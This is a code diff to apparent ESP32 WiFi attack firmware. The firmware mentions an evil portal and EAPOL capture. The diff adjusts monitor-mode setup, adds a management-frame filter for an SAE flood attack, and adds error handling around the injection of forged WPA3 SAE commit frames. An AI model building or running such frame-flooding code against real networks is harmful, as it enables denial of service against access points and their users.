@@ -65,6 +65,9 @@ static int g_beacon_list_count = 0;
 
 static void wifi_beacon_list_task(void *param);
 
+// Forward declarations for SAE flood attack
+static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type);
+
 uint16_t ap_count;
 wifi_ap_record_t *scanned_aps;
 const char *TAG = "WiFiManager";
@@ -1158,8 +1161,11 @@ bool wifi_manager_is_evil_portal_active(void) {
 }
 
 void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
-
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
+    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
+    ESP_ERROR_CHECK(esp_wifi_start());
 
     // Set hardware-level promiscuous filter based on callback type
     wifi_promiscuous_filter_t filter = {0};
@@ -1174,6 +1180,9 @@ void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
     } else if (callback == wifi_eapol_scan_callback) {
         // Data frames only for EAPOL
         filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
+    } else if (callback == sae_monitor_callback) {
+        // Management frames for SAE
+        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
     } else {
         // Default: capture all frame types (for raw capture, etc.)
         filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
@@ -3944,7 +3953,6 @@ static sae_data_t sae_ctx;
 static bool sae_initialized = false;
 
 // Forward declarations
-static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type);
 static void inject_sae_confirm_frame(void);
 static esp_err_t sae_init_context(const char *password, const uint8_t *own_mac, const uint8_t *peer_mac, const char *ssid);
 static esp_err_t sae_generate_commit(sae_data_t *sae);
@@ -4195,8 +4203,12 @@ static void inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
     frame_len += 32;
     
     // Transmit commit frame
-    esp_wifi_80211_tx(WIFI_IF_STA, sae_frame_buffer, frame_len, false);
-    sae_flood_packets_sent++;
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, sae_frame_buffer, frame_len, false);
+    if (err == ESP_OK) {
+        sae_flood_packets_sent++;
+    } else {
+        ESP_LOGE("SAE_FLOOD", "SAE commit injection failed: %s", esp_err_to_name(err));
+    }
 }
 
 static void sae_flood_task(void *param) {
